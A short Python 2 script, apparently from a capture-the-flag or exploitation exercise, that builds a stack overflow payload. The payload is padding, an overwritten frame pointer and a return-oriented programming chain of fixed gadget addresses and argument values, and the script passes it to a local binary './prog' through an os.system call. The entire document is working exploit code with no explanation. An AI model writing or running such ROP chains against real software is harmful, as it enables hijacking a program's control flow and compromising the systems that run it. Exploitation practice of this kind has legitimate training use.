#!/usr/bin/env python
import os
import struct

pop_ret = 0x11
pop_pop_ret = 0x3c
rop1 = 0x401d13
rop2 = 0x400e2c
rop3 = 0x40114f

payload =  "A"*20
payload += "BBBB"
payload += struct.pack("I", rop1)
payload += struct.pack("I", pop_ret)
payload += struct.pack("I", rop2)
payload += struct.pack("I", pop_pop_ret)
payload += struct.pack("I", rop3)

os.system("./prog '" + payload + "'")